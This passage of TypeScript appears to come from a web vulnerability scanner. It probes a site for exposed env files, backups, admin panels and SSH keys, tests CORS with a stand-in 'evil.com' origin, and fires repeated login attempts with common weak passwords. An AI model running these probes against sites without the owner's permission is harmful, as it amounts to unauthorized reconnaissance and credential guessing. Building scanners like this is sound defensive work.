                details: `Environment file is publicly accessible at ${file.path}. This can expose API keys, secrets, passwords, and other sensitive configuration.`,
              })
            }
          } else if (file.path.includes('.sql')) {
            // Check if it's actually a SQL file
            const contentResponse = await fetch(testUrl, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })
            const content = await contentResponse.text().toLowerCase()
            if (content.includes('create table') || content.includes('insert into') || content.includes('database')) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `${file.name} exposed: ${file.path}`,
                severity: file.severity,
                passed: false,
                details: `Database backup file is publicly accessible at ${file.path}. This can expose database structure and potentially sensitive data.`,
              })
            }
          } else if (file.path.includes('.zip') || file.path.includes('.tar') || file.path.includes('.bak') || file.path.includes('~')) {
            // Backup files
            findings.push({
              type: 'OTHER' as FindingType,
              title: `${file.name} exposed: ${file.path}`,
              severity: file.severity,
              passed: false,
              details: `Backup file is publicly accessible at ${file.path}. This can expose source code, configuration, or sensitive data.`,
            })
          } else if (file.path.includes('config')) {
            // Config files
            const contentResponse = await fetch(testUrl, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })
            const content = await contentResponse.text().toLowerCase()
            if (content.includes('password') || content.includes('secret') || content.includes('key') || content.includes('api')) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `${file.name} exposed: ${file.path}`,
                severity: file.severity,
                passed: false,
                details: `Configuration file is publicly accessible at ${file.path} and may contain sensitive information like passwords, API keys, or secrets.`,
              })
            }
          }
        }
      } catch (error) {
        // File not accessible, which is good - ignore
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No sensitive files detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No common sensitive files (.env, .git, backups, config files, phpinfo) were found to be publicly accessible.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkExposedEndpoints(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    // Common admin panels and endpoints
    const endpoints = [
      { path: '/admin', name: 'Admin panel', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/admin/login', name: 'Admin panel', severity: 'MEDIUM' as Severity, checkAuth: false },
      { path: '/administrator', name: 'Admin panel', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/wp-admin', name: 'WordPress admin', severity: 'MEDIUM' as Severity, checkAuth: false },
      { path: '/wp-login.php', name: 'WordPress login', severity: 'MEDIUM' as Severity, checkAuth: false },
      { path: '/phpmyadmin', name: 'phpMyAdmin', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/pma', name: 'phpMyAdmin', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/phpmyadmin/index.php', name: 'phpMyAdmin', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/api', name: 'API endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/api/v1', name: 'API endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/api/v2', name: 'API endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/api/users', name: 'API endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/api/admin', name: 'API endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/graphql', name: 'GraphQL endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/debug', name: 'Debug endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/debug.php', name: 'Debug endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/test', name: 'Test endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/testing', name: 'Test endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/dev', name: 'Development endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/development', name: 'Development endpoint', severity: 'HIGH' as Severity, checkAuth: true },
      { path: '/staging', name: 'Staging endpoint', severity: 'MEDIUM' as Severity, checkAuth: true },
      { path: '/.well-known/security.txt', name: 'Security.txt', severity: 'INFO' as Severity, checkAuth: false },
      { path: '/robots.txt', name: 'Robots.txt', severity: 'INFO' as Severity, checkAuth: false },
      { path: '/sitemap.xml', name: 'Sitemap', severity: 'INFO' as Severity, checkAuth: false },
    ]

    // Check each endpoint
    for (const endpoint of endpoints) {
      try {
        const testUrl = `${baseUrl}${endpoint.path}`
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })

        if (response.ok) {
          const html = await response.text().toLowerCase()
          
          // Check if it's an admin panel
          if (endpoint.path.includes('admin') || endpoint.path.includes('phpmyadmin') || endpoint.path.includes('pma')) {
            if (html.includes('login') || html.includes('password') || html.includes('username') || 
                html.includes('admin') || html.includes('phpmyadmin') || html.includes('database')) {
              if (endpoint.checkAuth) {
                // Check if it requires authentication
                if (!html.includes('401') && !html.includes('403') && !html.includes('unauthorized') && !html.includes('forbidden')) {
                  findings.push({
                    type: 'OTHER' as FindingType,
                    title: `Exposed ${endpoint.name}: ${endpoint.path}`,
                    severity: endpoint.severity,
                    passed: false,
                    details: `${endpoint.name} is accessible at ${endpoint.path} and may not be properly protected. This could allow unauthorized access.`,
                  })
                }
              } else {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `${endpoint.name} accessible: ${endpoint.path}`,
                  severity: endpoint.severity,
                  passed: false,
                  details: `${endpoint.name} is accessible at ${endpoint.path}. Ensure it's properly secured with authentication.`,
                })
              }
            }
          }
          // Check if it's an API endpoint
          else if (endpoint.path.includes('api') || endpoint.path.includes('graphql')) {
            if (endpoint.checkAuth) {
              // Try to access without authentication
              const contentType = response.headers.get('content-type') || ''
              if (contentType.includes('json') || html.includes('{') || html.includes('error') || html.includes('message')) {
                // It's likely an API endpoint
                if (!html.includes('401') && !html.includes('403') && !html.includes('unauthorized') && !html.includes('forbidden') && !html.includes('authentication')) {
                  findings.push({
                    type: 'OTHER' as FindingType,
                    title: `Weakly protected ${endpoint.name}: ${endpoint.path}`,
                    severity: endpoint.severity,
                    passed: false,
                    details: `${endpoint.name} at ${endpoint.path} appears to be accessible without proper authentication. This could expose sensitive data or functionality.`,
                  })
                }
              }
            }
          }
          // Check if it's a debug/test endpoint
          else if (endpoint.path.includes('debug') || endpoint.path.includes('test') || endpoint.path.includes('dev') || endpoint.path.includes('development') || endpoint.path.includes('staging')) {
            if (endpoint.checkAuth) {
              if (!html.includes('401') && !html.includes('403') && !html.includes('unauthorized') && !html.includes('forbidden')) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Exposed ${endpoint.name}: ${endpoint.path}`,
                  severity: endpoint.severity,
                  passed: false,
                  details: `${endpoint.name} is accessible at ${endpoint.path} and may expose debug information, test data, or development code. This should not be accessible in production.`,
                })
              }
            }
          }
        }
      } catch (error) {
        // Endpoint not accessible, which is good - ignore
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No exposed endpoints detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No common exposed admin panels, API endpoints, or debug endpoints were detected.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkAuthVulnerabilities(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    // Common authentication endpoints
    const authEndpoints = [
      '/login',
      '/signin',
      '/auth/login',
      '/auth/signin',
      '/user/login',
      '/account/login',
      '/admin/login',
      '/wp-login.php',
      '/api/login',
      '/api/auth/login',
      '/api/v1/login',
      '/api/v1/auth/login',
    ]

    // Test each authentication endpoint
    for (const endpoint of authEndpoints) {
      try {
        const testUrl = `${baseUrl}${endpoint}`
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })

        if (response.ok) {
          const html = await response.text().toLowerCase()
          
          // Check if it's actually a login page
          if (html.includes('login') || html.includes('password') || html.includes('username') || 
              html.includes('email') || html.includes('sign in')) {
            
            // Test 1: Check for rate limiting
            let rateLimitFound = false
            try {
              // Make multiple rapid requests to test rate limiting
              const requests = []
              for (let i = 0; i < 10; i++) {
                requests.push(
                  fetch(testUrl, {
                    method: 'POST',
                    headers: {
                      'User-Agent': 'VulnerabilityScanner/1.0',
                      'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `username=test${i}&password=test${i}`,
                    redirect: 'follow',
                  })
                )
              }
              
              const responses = await Promise.all(requests)
              let successCount = 0
              let rateLimitCount = 0
              
              for (const res of responses) {
                if (res.ok || res.status === 401 || res.status === 403) {
                  successCount++
                }
                if (res.status === 429 || res.status === 503) {
                  rateLimitCount++
                }
              }
              
              // If all requests succeeded without rate limiting
              if (successCount >= 8 && rateLimitCount === 0) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `No rate limiting on login endpoint: ${endpoint}`,
                  severity: 'HIGH' as Severity,
                  passed: false,
                  details: `Login endpoint at ${endpoint} does not appear to have rate limiting. This allows brute-force attacks and credential stuffing.`,
                })
                rateLimitFound = true
              }
            } catch (error) {
              // Ignore errors
            }

            // Test 2: Check for weak password policy
            try {
              // Try submitting weak passwords
              const weakPasswords = ['123456', 'password', 'admin', '12345', 'qwerty']
              let weakPasswordAccepted = false
              
              for (const weakPwd of weakPasswords) {
                try {
                  const testResponse = await fetch(testUrl, {
                    method: 'POST',
                    headers: {
                      'User-Agent': 'VulnerabilityScanner/1.0',
                      'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `username=test&password=${weakPwd}`,
                    redirect: 'follow',
                  })
                  
                  const responseText = await testResponse.text().toLowerCase()
                  
                  // Check if password validation message appears
                  if (!responseText.includes('password') && !responseText.includes('weak') && 
                      !responseText.includes('minimum') && !responseText.includes('length') &&
                      !responseText.includes('requirement')) {
                    // No password policy message - might accept weak passwords
                    weakPasswordAccepted = true
                  }
                } catch (error) {
                  // Ignore errors
                }
              }
              
              if (weakPasswordAccepted) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Weak passwords may be allowed on: ${endpoint}`,
                  severity: 'MEDIUM' as Severity,
                  passed: false,
                  details: `Login endpoint at ${endpoint} may not enforce strong password policies. This allows users to use weak passwords.`,
                })
              }
            } catch (error) {
              // Ignore errors
            }

            // Test 3: Check session management
            try {
              const sessionResponse = await fetch(testUrl, {
                method: 'POST',
                headers: {
                  'User-Agent': 'VulnerabilityScanner/1.0',
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'username=test&password=test',
                redirect: 'follow',
              })
              
              const cookies = sessionResponse.headers.get('set-cookie')
              const sessionCookie = cookies?.toLowerCase() || ''
              
              // Check for session security issues
              if (cookies) {
                const issues = []
                
                if (!sessionCookie.includes('httponly')) {
                  issues.push('HttpOnly flag missing')
                }
                
                if (!sessionCookie.includes('secure') && urlObj.protocol === 'https:') {
                  issues.push('Secure flag missing (HTTPS site)')
                }
                
                if (!sessionCookie.includes('samesite')) {
                  issues.push('SameSite attribute missing')
                }
                
                if (sessionCookie.includes('sessionid') || sessionCookie.includes('sess') || 
                    sessionCookie.includes('token')) {
                  // Check if session ID is predictable
                  const sessionMatch = cookies.match(/(?:sessionid|sess|token)=([^;]+)/i)
                  if (sessionMatch && sessionMatch[1]) {
                    const sessionId = sessionMatch[1]
                    // Check if it's too short or looks predictable
                    if (sessionId.length < 20) {
                      issues.push('Session ID may be too short or predictable')
                    }
                  }
                }
                
                if (issues.length > 0) {
                  findings.push({
                    type: 'OTHER' as FindingType,
                    title: `Broken session management on: ${endpoint}`,
                    severity: 'HIGH' as Severity,
                    passed: false,
                    details: `Session management issues detected: ${issues.join(', ')}. This can lead to session hijacking and unauthorized access.`,
                  })
                }
              }
            } catch (error) {
              // Ignore errors
            }

            // Test 4: Check for JWT exposure
            try {
              const jwtResponse = await fetch(testUrl, {
                method: 'POST',
                headers: {
                  'User-Agent': 'VulnerabilityScanner/1.0',
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'username=test&password=test',
                redirect: 'follow',
              })
              
              const responseText = await jwtResponse.text()
              const responseHeaders = jwtResponse.headers
              
              // Check for JWT in response body
              const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g
              const jwtMatches = responseText.match(jwtPattern)
              
              if (jwtMatches && jwtMatches.length > 0) {
                // Check if JWT is guessable (weak secret)
                for (const jwt of jwtMatches) {
                  try {
                    const parts = jwt.split('.')
                    if (parts.length === 3) {
                      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')))
                      
                      // Check for weak JWT claims
                      if (payload.iat && payload.exp) {
                        const expiration = payload.exp - payload.iat
                        if (expiration > 86400 * 30) { // More than 30 days
                          findings.push({
                            type: 'OTHER' as FindingType,
                            title: `JWT exposed with long expiration: ${endpoint}`,
                            severity: 'MEDIUM' as Severity,
                            passed: false,
                            details: `JWT token found in response with expiration time of ${Math.round(expiration / 86400)} days. Long-lived tokens increase security risk.`,
                          })
                        }
                      }
                      
                      // Check if JWT is in response body (should be in headers only)
                      findings.push({
                        type: 'OTHER' as FindingType,
                        title: `JWT exposed in response: ${endpoint}`,
                        severity: 'HIGH' as Severity,
                        passed: false,
                        details: `JWT token is exposed in the response body. Tokens should only be transmitted in secure HTTP headers. This increases risk of token theft.`,
                      })
                    }
                  } catch (error) {
                    // Invalid JWT format
                  }
                }
              }
              
              // Check for JWT in headers
              const authHeader = jwtResponse.headers.get('authorization')
              if (authHeader && authHeader.startsWith('Bearer ')) {
                const token = authHeader.substring(7)
                if (token.length < 50) {
                  findings.push({
                    type: 'OTHER' as FindingType,
                    title: `JWT may be guessable: ${endpoint}`,
                    severity: 'MEDIUM' as Severity,
                    passed: false,
                    details: `JWT token appears to be short or potentially guessable. Ensure strong secret keys are used for JWT signing.`,
                  })
                }
              }
            } catch (error) {
              // Ignore errors
            }

            // Test 5: Check for brute-force protection
            if (!rateLimitFound) {
              // Additional check for CAPTCHA or other brute-force protection
              if (!html.includes('captcha') && !html.includes('recaptcha') && 
                  !html.includes('hcaptcha') && !html.includes('turnstile')) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Missing brute-force protection on: ${endpoint}`,
                  severity: 'MEDIUM' as Severity,
                  passed: false,
                  details: `Login endpoint at ${endpoint} does not appear to have CAPTCHA or other brute-force protection mechanisms visible.`,
                })
              }
            }
          }
        }
      } catch (error) {
        // Endpoint not accessible, ignore
      }
    }

    // Test 6: Check for IDOR (Insecure Direct Object Reference)
    // This is harder to test automatically, but we can check for common patterns
    try {
      const idorTestUrls = [
        `${baseUrl}/api/user/1`,
        `${baseUrl}/api/users/1`,
        `${baseUrl}/api/profile/1`,
        `${baseUrl}/user/1`,
        `${baseUrl}/users/1`,
        `${baseUrl}/account/1`,
        `${baseUrl}/api/account/1`,
      ]

      for (const testUrl of idorTestUrls) {
        try {
          const response = await fetch(testUrl, {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })

          if (response.ok) {
            const contentType = response.headers.get('content-type') || ''
            if (contentType.includes('json')) {
              const json = await response.json()
              
              // Check if it returns user data without authentication
              if (json.email || json.username || json.name || json.id) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Possible IDOR vulnerability: ${testUrl}`,
                  severity: 'HIGH' as Severity,
                  passed: false,
                  details: `Endpoint ${testUrl} appears to return user data without proper authorization checks. This may indicate an Insecure Direct Object Reference (IDOR) vulnerability.`,
                })
              }
            }
          }
        } catch (error) {
          // Ignore errors
        }
      }
    } catch (error) {
      // Ignore errors
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No authentication vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No common authentication or authorization vulnerabilities were detected. Note: Full testing requires authenticated access.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkCORSMisconfigurations(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    // Test CORS with a cross-origin request
    const urlObj = new URL(url)
    const origin = `${urlObj.protocol}//${urlObj.host}`
    
    // Create a test origin (different domain)
    const testOrigin = 'https://evil.com'
    
    try {
      const response = await fetch(url, {
        method: 'OPTIONS',
        headers: {
          'Origin': testOrigin,
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Content-Type',
        },
      })
      
      const acao = response.headers.get('access-control-allow-origin')
      const acac = response.headers.get('access-control-allow-credentials')
      const acam = response.headers.get('access-control-allow-methods')
      const acah = response.headers.get('access-control-allow-headers')
      
      if (acao) {
        // Check for wildcard origin
        if (acao === '*') {
          findings.push({
            type: 'OTHER' as FindingType,
            title: 'CORS: Access-Control-Allow-Origin set to wildcard (*)',
            severity: 'HIGH' as Severity,
            passed: false,
            details: 'CORS is configured with Access-Control-Allow-Origin: *. This allows any origin to access the resource, which is a security risk.',
          })
          
          // Check if credentials are also allowed (this is a critical misconfiguration)
          if (acac && acac.toLowerCase() === 'true') {
            findings.push({
              type: 'OTHER' as FindingType,
              title: 'CORS: Credentials allowed with wildcard origin',
              severity: 'HIGH' as Severity,
              passed: false,
              details: 'CORS allows credentials (Access-Control-Allow-Credentials: true) with wildcard origin (*). This is a critical misconfiguration that browsers will reject, but indicates insecure configuration.',
            })
          }
        } else if (acao === testOrigin || acao === origin) {
          // Origin is allowed, check credentials
          if (acac && acac.toLowerCase() === 'true') {
            findings.push({
              type: 'OTHER' as FindingType,
              title: 'CORS: Credentials allowed',
              severity: 'INFO' as Severity,
              passed: true,
              details: `CORS allows credentials for origin: ${acao}. Ensure this is intentional and the origin is trusted.`,
            })
          }
        }
        
        // Check allowed methods
        if (acam) {
          const methods = acam.split(',').map(m => m.trim().toUpperCase())
          const unsafeMethods = ['PUT', 'DELETE', 'PATCH', 'TRACE']
          const foundUnsafe = methods.filter(m => unsafeMethods.includes(m))
          
          if (foundUnsafe.length > 0) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `CORS: Unsafe methods allowed (${foundUnsafe.join(', ')})`,
              severity: 'MEDIUM' as Severity,
              passed: false,
              details: `CORS allows unsafe HTTP methods: ${foundUnsafe.join(', ')}. These methods can be dangerous if not properly protected.`,
            })
          }
        }
      } else {
        // No CORS headers - test with actual request
        try {
          const getResponse = await fetch(url, {
            method: 'GET',
            headers: {
              'Origin': testOrigin,
            },
          })
          
          const getAcao = getResponse.headers.get('access-control-allow-origin')
          if (getAcao === '*') {
            findings.push({
              type: 'OTHER' as FindingType,
              title: 'CORS: Access-Control-Allow-Origin set to wildcard (*)',
              severity: 'HIGH' as Severity,
              passed: false,
              details: 'CORS is configured with Access-Control-Allow-Origin: * in GET response. This allows any origin to access the resource.',
            })
          }
        } catch (error) {
          // Ignore
        }
      }
    } catch (error) {
      // CORS preflight failed, which might be expected
    }
    
    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No CORS misconfigurations detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No obvious CORS misconfigurations were detected. CORS appears to be properly configured or not enabled.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkServerFrameworkVulnerabilities(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })
    
    const headers = response.headers
    const html = await response.text()
    const htmlLower = html.toLowerCase()
    
    // Check Server header for version information
    const server = headers.get('server')
    if (server) {
      // Check for outdated versions
      const serverLower = server.toLowerCase()
      
      // Apache version checks
      if (serverLower.includes('apache')) {
        const apacheVersion = server.match(/apache\/([\d.]+)/i)
        if (apacheVersion) {
          const version = apacheVersion[1]
          const major = parseInt(version.split('.')[0])
          const minor = parseInt(version.split('.')[1] || '0')
          
          // Apache 2.2 is EOL, Apache 2.4.0-2.4.55 have known vulnerabilities
          if (major < 2 || (major === 2 && minor < 4)) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Outdated Apache version detected: ${version}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `Apache version ${version} is outdated and may contain known vulnerabilities. Consider upgrading to the latest stable version.`,
            })
          } else if (major === 2 && minor === 4) {
            // Parse patch version (e.g., 2.4.56 -> patch = 56)
            const patchMatch = version.match(/^2\.4\.(\d+)/)
            if (patchMatch) {
              const patch = parseInt(patchMatch[1])
              if (patch < 56) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Potentially outdated Apache version: ${version}`,
                  severity: 'MEDIUM' as Severity,
                  passed: false,
                  details: `Apache version ${version} may have known vulnerabilities. Consider upgrading to the latest version.`,
                })
              }
            }
          }
        }
      }
      
      // Nginx version checks
      if (serverLower.includes('nginx')) {
        const nginxVersion = server.match(/nginx\/([\d.]+)/i)
        if (nginxVersion) {
          const version = nginxVersion[1]
          const major = parseInt(version.split('.')[0])
          const minor = parseInt(version.split('.')[1] || '0')
          
          // Nginx 1.18 and below have known vulnerabilities
          if (major < 1 || (major === 1 && minor < 20)) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Outdated Nginx version detected: ${version}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `Nginx version ${version} is outdated and may contain known vulnerabilities. Consider upgrading to the latest stable version.`,
            })
          }
        }
      }
      
      // IIS version checks
      if (serverLower.includes('microsoft-iis') || serverLower.includes('iis')) {
        const iisVersion = server.match(/microsoft-iis\/([\d.]+)/i) || server.match(/iis\/([\d.]+)/i)
        if (iisVersion) {
          const version = iisVersion[1]
          const major = parseFloat(version)
          
          // IIS 8.5 and below are outdated
          if (major < 10) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Outdated IIS version detected: ${version}`,
              severity: 'MEDIUM' as Severity,
              passed: false,
              details: `IIS version ${version} may be outdated. Consider upgrading to the latest version for security patches.`,
            })
          }
        }
      }
    }
    
    // Check for CMS/framework indicators
    // WordPress
    if (htmlLower.includes('wp-content') || htmlLower.includes('wordpress') || htmlLower.includes('/wp-includes/')) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'WordPress detected',
        severity: 'INFO' as Severity,
        passed: false,
        details: 'WordPress CMS detected. Ensure WordPress core, themes, and plugins are kept up to date to prevent known vulnerabilities.',
      })
      
      // Check for WordPress version
      const wpVersion = html.match(/wp-content\/themes\/.*?ver=([\d.]+)/i) || 
                       html.match(/generator.*?wordpress\s+([\d.]+)/i)
      if (wpVersion) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'WordPress version information exposed',
          severity: 'LOW' as Severity,
          passed: false,
          details: 'WordPress version information is exposed, which can help attackers identify known vulnerabilities.',
        })
      }
    }
    
    // Drupal
    if (htmlLower.includes('drupal') || htmlLower.includes('/sites/default/')) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'Drupal detected',
        severity: 'INFO' as Severity,
        passed: false,
        details: 'Drupal CMS detected. Ensure Drupal core and modules are kept up to date to prevent known vulnerabilities.',
      })
    }
    
    // Joomla
    if (htmlLower.includes('joomla') || htmlLower.includes('/media/jui/')) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'Joomla detected',
        severity: 'INFO' as Severity,
        passed: false,
        details: 'Joomla CMS detected. Ensure Joomla core and extensions are kept up to date to prevent known vulnerabilities.',
      })
    }
    
    // Check for known vulnerable plugins/versions in meta tags
    const generator = headers.get('x-generator') || ''
    if (generator) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: `Framework version exposed: ${generator}`,
        severity: 'LOW' as Severity,
        passed: false,
        details: `Framework/application version is exposed in X-Generator header: ${generator}. This can help attackers identify known vulnerabilities.`,
      })
    }
    
    // Check HTML for generator meta tag
    const generatorMatch = html.match(/<meta[^>]*name=["']generator["'][^>]*content=["']([^"']+)["']/i)
    if (generatorMatch) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: `Framework version exposed in meta tag: ${generatorMatch[1]}`,
        severity: 'LOW' as Severity,
        passed: false,
        details: `Framework/application version is exposed in HTML meta tag: ${generatorMatch[1]}. Consider removing this information.`,
      })
    }
    
    // Check for misconfigured server banners
    const poweredBy = headers.get('x-powered-by')
    if (poweredBy) {
      // Check for version information in X-Powered-By
      if (poweredBy.match(/[\d.]+/)) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: `Server version exposed in X-Powered-By: ${poweredBy}`,
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `X-Powered-By header exposes version information: ${poweredBy}. This can help attackers identify known vulnerabilities. Consider removing or obfuscating this header.`,
        })
      }
    }
    
    // Check for ASP.NET version exposure
    const aspNetVersion = headers.get('x-aspnet-version')
    if (aspNetVersion) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: `ASP.NET version exposed: ${aspNetVersion}`,
        severity: 'MEDIUM' as Severity,
        passed: false,
        details: `ASP.NET version is exposed in X-AspNet-Version header: ${aspNetVersion}. This can help attackers identify known vulnerabilities.`,
      })
    }
    
    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No server/framework vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No obvious outdated CMS/framework versions or misconfigured server banners were detected.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkNetworkVulnerabilities(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const host = urlObj.hostname
    
    // Note: SSH configuration testing requires direct SSH connection
    // This is a simplified check that looks for SSH-related information
    
    // Check for SSH banner exposure (if SSH is accessible via HTTP somehow)
    // This is rare but some misconfigurations expose SSH info
    
    // Check for common SSH-related endpoints that might expose configuration
    const sshTestPaths = [
      '/.ssh/',
      '/.ssh/config',
      '/.ssh/authorized_keys',
      '/ssh',
      '/ssh_config',
    ]
    
    for (const path of sshTestPaths) {
      try {
        const testUrl = `${urlObj.protocol}//${host}${path}`
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })
        
        if (response.ok) {
          const content = await response.text()
          
          if (content.includes('ssh') || content.includes('authorized_keys') || 
              content.includes('host') || content.includes('identityfile')) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `SSH configuration file exposed: ${path}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `SSH configuration or key file is publicly accessible at ${path}. This can expose SSH keys and configuration, allowing unauthorized access.`,
            })
          }
        }
      } catch (error) {
        // File not accessible, which is good
      }
    }
    
    // Check for SSH key exposure in common locations
    const keyPaths = [
      '/id_rsa',
      '/id_rsa.pub',
      '/id_dsa',
      '/id_dsa.pub',
      '/id_ecdsa',
      '/id_ecdsa.pub',
      '/id_ed25519',
      '/id_ed25519.pub',
      '/.ssh/id_rsa',
      '/.ssh/id_rsa.pub',
    ]
    
    for (const keyPath of keyPaths) {
      try {
        const testUrl = `${urlObj.protocol}//${host}${keyPath}`
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })
        
        if (response.ok) {
          const content = await response.text()
          
          // Check if it looks like an SSH key
          if (content.includes('BEGIN') && (content.includes('PRIVATE KEY') || content.includes('PUBLIC KEY') || 
              content.includes('RSA') || content.includes('DSA') || content.includes('ECDSA'))) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `SSH key file exposed: ${keyPath}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `SSH key file is publicly accessible at ${keyPath}. This is a critical security issue that can allow unauthorized server access.`,
            })
          }
        }
      } catch (error) {
        // File not accessible, which is good
      }
    }
    
    // Note: Actual SSH connection testing (port 22, weak ciphers, etc.) 
    // requires Node.js net/tls modules and direct SSH connection
    // This is beyond the scope of a web-based scanner
    
    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No SSH configuration vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No SSH configuration files or keys were found to be publicly accessible via HTTP. Note: Direct SSH connection testing requires specialized tools.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkAPIVulnerabilities(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    // Common API endpoints to test
    const apiEndpoints = [
      '/api',
      '/api/v1',
      '/api/v2',
      '/api/users',
      '/api/user',
      '/api/data',
      '/api/info',
      '/api/config',
      '/api/status',
      '/api/health',
      '/graphql',
      '/graphiql',
      '/api/graphql',
    ]

    for (const endpoint of apiEndpoints) {
      try {
        const testUrl = `${baseUrl}${endpoint}`
        
        // Test 1: Check for missing authentication
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })

        if (response.ok) {
          const contentType = response.headers.get('content-type') || ''
          
          // Check if it's a JSON API response
          if (contentType.includes('json')) {
            const json = await response.json()
            
            // Check for sensitive data exposure
            const sensitiveFields = ['password', 'token', 'secret', 'key', 'api_key', 'apikey', 
                                   'access_token', 'refresh_token', 'ssn', 'credit_card', 'card_number',
                                   'email', 'phone', 'address', 'dob', 'date_of_birth']
            
            const jsonString = JSON.stringify(json).toLowerCase()
            const foundSensitive = sensitiveFields.filter(field => jsonString.includes(field))
            
            if (foundSensitive.length > 0) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `Sensitive data exposure in API response: ${endpoint}`,
